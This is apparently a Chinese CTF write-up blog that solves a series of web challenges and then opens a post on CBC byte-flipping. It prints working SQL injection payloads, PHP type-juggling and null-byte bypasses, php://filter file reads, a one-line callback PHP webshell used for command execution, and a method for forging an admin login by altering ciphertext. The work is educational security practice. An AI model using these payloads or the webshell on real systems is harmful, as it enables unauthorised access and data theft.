那我们就访问http://chinalover.sinaapp.com/web11/robots.txt 发现提示了源代码和sql.php 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 发现intval函数，作用是将字符串中的整数值取出，并且取出的字符串开始部分的整数值，如intval(1024a1)=1024 intval(a1)=0 并且有了intval函数，我们就没办法对参数id进行sql注入 并且服务器对GET的参数id进行过滤，经过php弱类型比较，如果等于1024，则退出程序 猜测flag就在id为1024里，所以我们思路是让GET的参数id经过intval函数处理的值为1024，但是弱类型比较不等于1024 我们知道php弱类型比较两个值是先将这两个值转化为同一类型，这里是字符串与整形的弱类型，就将字符串转化为整形，也是将字符串的整数值部分取出，与intval函数类似，除了处理”e”,”.”,”E” 举个例子 12345678910&lt;?php$id = intval(\"1024e1\") //$id=1024\"1024e1\" == 1024 //false\"1024e1\" == 10240 //true$id = intval(\"1024.1\") //$id=1024\"1024.1\" == 1024 //false\"1024.1\" == 1024.1 //true?&gt; 那么就很明显，我们可以GET参数id=1024e1或者1024.1，都能拿到flag sql injection 3网址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 页面显示了执行的sql语句和返回的信息，很明显的注入点在id，数字型注入且从sql语句看id被单引号包裹 输入id=1’ 发现单引号被转义了，猜测是宽字节注入，输入id=1%df%27%23，正确返回信息，就可以开始注入了 sql语句就提示了news表，先看一下news表下的列名 输入id=0%df’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6e657773 %23 列名为id和title 输入id=0%df%27%20union%20select%201,group_concat(title)%20from%20news%23 注出title信息 没有发现flag 那再看看其他表 输入id=0%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 表名为ctf,ctf2,ctf3,ctf4,news 看看ctf表下的列名 列名为user,pw 看看ctf2表下列名 列名为id,content 看看ctf3表下列名 列名为id,email,token 最后ctf4表下列名 看到flag列 看看flag列下信息 拿到flag /x00网址：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php 给出了源代码 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~';&#125; 看到ereg函数就想起了%00(NULL)截断，而且ereg和strpos处理数组都会返回null值，null不全等于False，所以直接输入nctf[]即可获得flag 或者是输入nctf=1%00%23biubiubiu，这里#要用%23代替 也可以得到flag bypass again网址：http://chinalover.sinaapp.com/web17/index.php 依然是md5碰撞 GET参数a=240610708&amp;b=QNKCDZO 变量覆盖网址：http://chinalover.sinaapp.com/web18/index.php 看到提示代码http://chinalover.sinaapp.com/web18/source.php 给出了源代码 123456789&lt;?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=\"alert alert-success\"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; extract函数的作用是将数组中的键名作为变量名，键值作为变量值，那么思路就很清晰了，我们post两个参数pass和thepassword_123，给这两个变量赋值相同，就可以拿到flag了 伪装者网址：http://chinalover.sinaapp.com/web4/xxx.php 提示本地登录才行，利用burp抓包添加X-Forwarded-For:127.0.0.1即可，但这里题目坏了，改了也拿不到flag 上传绕过网址：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html 文件上传题目，因为是html页面，所以先看看源代码 发现上传到upload.php，而且同时上传了一个隐藏值 1&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt; 访问upload.php，提示我们只能上传jpg,png,gif格式文件 先试着上传一个png文件 提示必须上传php格式文件 再试着上传php文件 提示上传不了，看一下二者共同有的信息是一个数组Array,里面有文件名后缀，推测是先对文件后缀名检测，如果不是jpg,png，则过滤 试着burp抓包修改文件名为demo.png.php 很明显服务器是最后的后缀名检测，再尝试php5,Php等都不行 所以只能后缀名是png,jpg的文件才能成功上传，然后我们需要想办法让服务器认为这是一个php文件 上传png文件后的信息看到了basename，猜测跟目录有关，basename这个函数是将路径中的文件名取出，并且我们之前查看源代码也看到了提交了隐藏的目录信息 我们先试着修改目录，将/uploads/修改成/uploads/demo.php 发现文件名也跟随着目录值而改变了，所以我们猜测服务器就是根据basename后的文件名进行检测是不是php文件 经过查询，basename是可以用十六进制的00截断的 我们将/uploads/修改成/uploads/demo.php (后面有个空格) 然后在burp的Hex中将对应的20(空格)修改成00 成功拿到flag SQL注入1网址：http://chinalover.sinaapp.com/index.php http://chinalover.sinaapp.com/index.phps给出了源代码 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; 从源代码看出用户名为admin,且密码是正确的密码才能返回flag 但是对我们POST的参数user毫无过滤，我们只需要POST参数user=admin’)#即可获得flag pass check网址：http://chinalover.sinaapp.com/web21/ 给出了源代码提示： 1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; 拿到flag的条件是strcmp()函数返回0，即两个变量比较结果相等，我们不知道$pass1变量的值，但是strcmp函数处理数组时会返回NULL 所以我们POST参数pass[]= 即可拿到flag 起名字真难网址：http://chinalover.sinaapp.com/web12/index.php 给出了源代码提示 123456789101112131415161718192021&lt;?php function noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 对我们GET的参数key进行了检查，不能包含[1-9]任意一个字符，否则就拿不到flag，key值要等于54975581388，可以考虑转化为十六进制，54975581388 的十六进制为0xccccccccc 输入key=0xccccccccc 拿到flag php 反序列化这题服务器崩了，只能本地搭环境演示 给出了源代码： 12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET['pass'])) &#123; $pass = $_GET['pass']; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = \"*\"; if ($o-&gt;secret === $o-&gt;enter) echo \"Congratulation! Here is my secret: \".$o-&gt;secret; else echo \"Oh no... You can't fool me\"; &#125; else echo \"are you trolling?\";&#125;?&gt; 首先创建了一个类，然后接受GET参数pass，并且对pass进行了去掉转义的处理，get_magic_quotes_gpc()是检查是否对变量有转义处理，如果返回1则说明有转义处理，那么执行stripslashes函数，去掉转义，然后对pass参数进行反转义处理，然后检查对象o的secret变量是否全等于对象o的enter变量，如果相等则输出flag，可是我们不知道enter变量的值，所以我们可以考虑使用引用处理 例如$a =&amp; $b，则$a和$b指向同一个值，当$a的值变化时，$b的值也随之变化 1234567891011&lt;?php$a =&amp; $b;$a = 1;echo '$b='.$b; //$b=1echo '&lt;br&gt;';$b = 2;echo '$a='.$a; //$a=2?&gt; 所以我们使$o-&gt;enter =&amp; $o-&gt;secret 12345678910111213&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;$o = new just4fun();$o-&gt;enter =&amp; $o-&gt;secret;$pass = serialize($o);echo $pass;?&gt; 拿到序列化的$pass，然后将这个pass GET给服务器 成功拿到flag sql injection 4网址：http://chinalover.sinaapp.com/web15/index.php 给出了源代码提示 1234567891011121314151617181920212223&lt;?php#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\\&apos;&apos;.$username.&apos;\\&apos; AND pass=\\&apos;&apos;.$password.&apos;\\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;?&gt; 首先需要了解htmlentities() 函数：把字符转换为 HTML 实体 而htmlentities($str, ENT_QUOTES); 是 转换双引号和单引号 我们看个例子 12345678910111213141516171819&lt;?phpfunction clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);echo '$username='.$username;echo '&lt;br&gt;';echo '$password='.$password;echo '&lt;br&gt;';$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';echo $query;?&gt; 我们试着GET参数username=’admin’，password=”1” 在浏览器页面上看还是单引号和双引号，而看下源代码 发现就不是原来的单引号和双引号了，相等于转变成了其他字符，而我们要进行sql注入，就必须闭合单引号 既然没办法通过输入单引号来闭合单引号，那么还可以通过转义单引号的方法 试着输入username=\\,password= or 1=1 %23 可以此时的sql语句是 1SELECT * FROM users WHERE name=&apos;\\&apos; AND pass=&apos; or 1=1#&apos;; 可以看到一个单引号被转义，name=后的单引号和pass=后的单引号闭合了，我们再构造or 1=1语句构造恒真语句 这样就必定有查询结果 最后拿到flag 综合题网址：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php 页面是一串jsfuck代码，拿到解码网站解码后结果是1bc29b36f623ba82aaf6724fd3b16718.php 访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 页面显示提示在脑袋里，马上抓包看看响应头，发现tip: history of bash 查询bash：Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。 那么我们访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 发现命令zip -r flagbak.zip，解压过压缩包，那我们访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包 获得flag is:nctf{bash_history_means_what} SQL注入2网址：http://4.chinalover.sinaapp.com/web6/index.php 给出了源代码提示： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; 拿到flag条件是查询的结果和我们POST的参数pass的md5值一样，服务器对我们post的参数user没有过滤，根据提示，我们使用union注入控制查询结果，使之和pass的md5值相等 payloads:user=’ union select md5(1)#&amp;pass=1 拿到flag 综合题2网址：http://cms.nuptzj.cn/ 题目给出了提示这题不是xss，浏览源代码，发现说明文件http://cms.nuptzj.cn/about.php?file=sm.txt 看到file参数，猜测可能存在文件包含漏洞，试着用php://fileter读取about.php源代码 解码得about.php源代码： 123456789101112131415&lt;?php$file=$_GET[&apos;file&apos;];if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;echo &quot;fileåæ°ä¸è½ä¸ºç©ºï¼&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&apos;ææç®å½ï¼ç¦æ­¢æ¥çï¼ä½æ¯ããã&apos;)&lt;/script&gt;&quot;;&#125;&#125; 再看看say.php源码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &apos;config.php&apos;;$nice=$_POST[&apos;nice&apos;];$say=$_POST[&apos;usersay&apos;];if(!isset($_COOKIE[&apos;username&apos;]))&#123;setcookie(&apos;username&apos;,$nice);setcookie(&apos;userpass&apos;,&apos;&apos;);&#125;$username=$_COOKIE[&apos;username&apos;];$userpass=$_COOKIE[&apos;userpass&apos;];if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;echo &quot;&lt;script&gt;alert(&apos;æµç§°æçè¨åå®¹ä¸è½ä¸ºç©ºï¼(å¦ææåå®¹ä¹å¼¹åºæ­¤æ¡ï¼ä¸æ¯ç½ç«é®é¢å~ å¥½å§ï¼ç»ä¸ªæç¤ºï¼æ¥çé¡µé¢æºç ææåï¼)&apos;);&lt;/script&gt;&quot;;exit();&#125;$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼&quot;.mysql_error());mysql_select_db($db_name,$con);$nice=mysql_real_escape_string($nice);$username=mysql_real_escape_string($username);$userpass=mysql_real_escape_string($userpass);$result=mysql_query(&quot;SELECT username FROM admin where username=&apos;$nice&apos;&quot;,$con);$login=mysql_query(&quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&quot;,$con);if(mysql_num_rows($result)&gt;0 &amp;&amp; mysql_num_rows($login)&lt;=0)&#123;echo &quot;&lt;script&gt;alert(&apos;æµç§°å·²è¢«ä½¿ç¨ï¼è¯·æ´æ¢ï¼&apos;);&lt;/script&gt;&quot;;mysql_free_result($login);mysql_free_result($result);mysql_close($con);exit();&#125;mysql_free_result($login);mysql_free_result($result);$say=mysql_real_escape_string($say);mysql_query(&quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&quot;,$con);mysql_close($con);echo &apos;&lt;script&gt;alert(&quot;æå»ºåè°ç¤¾ä¼ï¼çè¨éè¦ç»è¿ç®¡çåå®¡æ ¸æå¯ä»¥æ¾ç¤ºï¼&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&apos;;?&gt; 对我们输入的参数都加以转义，没什么漏洞，继续看看还有什么文件，再源代码中还发现了so.php文件 看看它的源代码 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;æç´¢çè¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;div id=\"say\" name=\"say\" align=\"left\" style=\"width:1024px\"&gt;&lt;?phpif($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123;echo 'ä¸æ¶æ»´é»éï¼æ¬åè½åªæç¨æ¬å¬å¸å¼åçæµè§å¨æå¯ä»¥ç¨å~'; exit();&#125;$id=$_POST['soid'];include 'config.php';include 'antiinject.php';include 'antixss.php';$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(\"ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼\".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\");$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 我们看到这里的参数id虽然被mysql_real_escape_string函数处理过，但是在sql语句中是参数id是没有被引号包裹的，但是id经过自定义函数antiinject处理，这个函数在so.php未被定义，猜测可能定义在包含的文件antiinject.php中，我们再读取它的源代码： 12345678910&lt;?phpfunction antiinject($content)&#123;$keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\");$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], '',$info);&#125;return $info;&#125;?&gt; 很明显的一个过滤函数，通过str_replace函数过滤一些关键字，但是str_replace函数只需要双写就可以绕过，但是这里还过滤了空格，mysql中注释符/**/可以代替空格 这里还需注意将请求头的User-Agent字段修改为Xlcteam Browser 那么我们就可以愉快的注入了，首先POST参数soid=1，发现有查询结果，那么就可以注出查询返回列数 soid=1//oorrdoorrderer//by/**/4有查询结果 soid=1//oorrdoorrderer//by/**/5无查询结果，返回列数为4 soid=0时无查询结果，用union注入 soid=0//uunionnion//sselectelect/**/1,2,3,4 返回的列在2,3位置 soid=0//uunionnion//sselectelect/**/1,database(),3,4爆库 库名为sae-exploitblog 根据之前说明文本的提示表admin的结构 soid=0//uunionnion//sselectelect//1,(sselectelect//usernnameame//ffromrom//aadmindmin),(sselectelect//userppassass//ffromrom/**/aadmindmin),4 注出用户名admin和密码102 117 99 107 114 117 110 116 117 这里密码还经过函数antixss处理过，保险起见还是再读取一下antixss.php的源代码 123456789101112131415&lt;?phpfunction antixss($content)&#123;preg_match(&quot;/(.*)\\[a\\](.*)\\[\\/a\\](.*)/&quot;,$content,$url);$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&apos;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//å ä¸ºå¤ªèï¼å¾æï¼æä»¥ããã(è¿æ»¤è§åæ¥èªMramydnei)$re=$url[2];if(count($url)==0)&#123;return htmlspecialchars($content);&#125;else&#123;for($i=0;$i&lt;=count($key);$i++)&#123;$re=str_replace($key[$i], &apos;_&apos;,$re);&#125;return htmlspecialchars($url[1],ENT_QUOTES).&apos;&lt;a href=&quot;&apos;.$re.&apos;&quot;&gt;&apos;.$re.&apos;&lt;/a&gt;&apos;.htmlspecialchars($url[3],ENT_QUOTES);&#125;&#125;?&gt; 大概是过滤一些html标签关键字，我们注出的密码应该只是经过 htmlspecialchars函数处理，没有什么影响 那么得到用户名和密码，大概是要进入一个登陆界面 这时注意到about.php文件中过滤了关键字loginxlcteam 就试着访问http://cms.nuptzj.cn/loginxlcteam 没想到就访问到了登陆界面 我们试着将注出的用户名和密码输入，提示错误 此时回去看看说明的文本，里面提示了密码加密文件passencode.php 猜测可能密码有经过加密，我们先读取passencode.php 源代码 123456789101112131415&lt;?phpfunction passencode($content)&#123;//$pass=urlencode($content);$array=str_split($content);$pass=&quot;&quot;;for($i=0;$i&lt;count($array);$i++)&#123;if($pass!=&quot;&quot;)&#123;$pass=$pass.&quot; &quot;.(string)ord($array[$i]);&#125;else&#123;$pass=(string)ord($array[$i]);&#125;&#125;return $pass;&#125;?&gt; 看了加密的源代码，很明显我们注出的密码102 117 99 107 114 117 110 116 117是经过加密的，我们根据加密的过程写出解密的过程 12345678910111213141516&lt;?phpfunction passdecode($pass)&#123; $arr = explode(&quot; &quot;,$pass); $content = &quot;&quot;; for($i=0;$i&lt;count($arr);$i++)&#123; $content = $content.chr($arr[$i]); &#125; return $content;&#125;$pass = &quot;102 117 99 107 114 117 110 116 117&quot;;$content = passdecode($pass);echo $content;?&gt; 执行结果：fuckruntu 再次在登录界面输入用户名admin,密码fuckruntu 提示我们还差最后一步，并且提示将一句话木马放在网站根目录下的xlcteam.php文件中 既然在根目录下，我们还是可以在about.php中读取源代码 12345&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 查询得到这是一个回调函数的一句话木马 那么我们post参数www=preg_replace,wtf就是我们可以任意执行的命令 那么我们可以post参数wtf=print_r(scandir(‘./‘)); 发现文件：恭喜你获得flag2.txt 获得flag","categories":[{"name":"nctf-Web","slug":"nctf-Web","permalink":"https://Foxgrin.github.io/categories/nctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"CBC字节翻转攻击","slug":"CBC字节翻转攻击","date":"2018-08-11T03:12:00.000Z","updated":"2018-08-11T05:43:28.692Z","comments":true,"path":"/posts/47995/","link":"","permalink":"https://Foxgrin.github.io/posts/47995/","excerpt":"几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了","text":"几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了 CBC原理首先还是要稍微了解一下CBC加密和解密的原理 如果用公式来表示的话，如下：（C表示密文，E表示进行加密，P表示明文，D表示进行解密，IV表示初始向量） 再来看看如何进行攻击：（下面图片摘自《图解密码技术》一书） 上面就是CBC原理，其实看上去一脸懵逼很正常，但是其实我们只需要关注CBC解密的过程，因为我们攻击的过程就是解密的过程，为什么呢，我们来看实例的代码分析就知道了 实例实例来自bugkuctf web类最后一题login4 网址：http://118.89.219.210:49168/ 扫描目录发现存在文件.index.php.swp，下载下来后用linux 的vim -r 命令恢复文件后可以查看到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpdefine(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123; $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;&#125;if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = (string)$_POST[&apos;username&apos;]; $password = (string)$_POST[&apos;password&apos;]; if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;else&#123; echo &apos;&lt;body class=&quot;login-body&quot;&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; &#125;&#125;?&gt; 首先服务器接收我们POST的参数username和password，并对username进行检查，如果是admin，则退出程序，如果不是admin，则创建一个数组info，来存放我们输入的username和password，然后经过login函数，也就是cbc的加密，加密的过程是首先创建一个16位长度的随机字符串，然后与数组info序列化后的字符串plain进行CBC加密，也就是一系列的异或运算，具体的加密我们可以不用管，因为我们改变不了加密的过程，我们要操作的，是接下来的解密过程。再往下看程序，加密完以后，会将加密过程的初始化向量(也就是16位的随机字符串)iv和加密后的密文cipher经过base64加密后分别存放到cookie中，这样加密过程就算完成了。接下来，我们再次登录时，服务器执行check_login函数，将cookie中的iv和cipher字段值取出来进行base64解密后，进行cbc的解密，再将解密后字符串进行反序列化得到数组info，然后将info的username取出放入session的username字段，最后检查username如果是admin，则可以查看到flag，如果不是，则输出只有admin才可以查看flag，总的来说，这算是前后矛盾，一开始如果我们输入的username是admin，则提示admin查看不了flag，我们输入的如果不是admin，又提示admin才可以查看flag 所以，要拿到flag，我们的思路，就是一开始输入Admin，然后操作CBC解密的过程，让它最后解密出来的值变成admin，就可以拿到flag，为此，我们重点就是放在cbc解密的过程，来看一张比较清楚的思路图 分析解密的过程： (1)首先以16位为长度对密文进行分组 (2)初始化向量iv与前16位的解密的密文分组1进行位异或运算得到明文分组1 (3)密文分组1与解密的密文分组2进行异或运算得到明文分组2 (4)密文分组2与解密的密文分组3进行异或运算得到明文分组3 (5)以此类推 那我们就按照解密的过程的顺序逐步演示攻击的过程 首先我们对明文进行分组，因为我们加密的过程也是位异或，所以最终得到的密文位数是等于明文位数的 1234567891011121314151617181920&lt;?php$info = array('username'=&gt;'Admin','password'=&gt;'admin');$plain = serialize($info);echo $plain.'&lt;br&gt;';for($i = 0; $i &lt; strlen($plain); $i++)&#123; if($plain[$i] == 'A')&#123; $A_index = $i % 16; &#125; if($i % 16 == 0)&#123; echo '&lt;br&gt;'.$plain[$i]; &#125; else&#123; echo $plain[$i]; &#125;&#125;echo '&lt;br&gt;&lt;br&gt;'.'the index of A is: '.$A_index;?&gt; 这里我们定下一开始输入的username是Admin,password是admin,对info数组进行序列化处理然后分组 我们翻转的位置是A，我们要想办法将它翻转成a，从而将用户名变成admin，上面已经分析过了解密是位异或，A所处于的密文分组是分组2，它是与密文分组1进行位异或运算得到明文分组2的 所以我们要操纵的就是密文分组1的第9位，使它与A所处的密文分组2异或后得到a 